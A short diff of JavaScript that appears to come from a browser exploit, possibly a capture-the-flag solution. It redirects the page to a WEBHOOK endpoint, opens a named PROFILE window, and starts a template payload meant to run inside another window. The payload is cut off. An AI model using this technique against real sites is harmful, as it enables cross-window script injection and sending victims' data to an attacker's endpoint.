@@ -22,8 +22,8 @@ function openProfile() {
   // document.location.href = WEBHOOK;
 }
 
-window.open(ORIGIN, OPEN);
-get(WEBHOOK);
+window.location = WEBHOOK;
+window.open(PROFILE, OPEN);
 
 const payload = `
 const profile = window.open("", "${OPEN}");
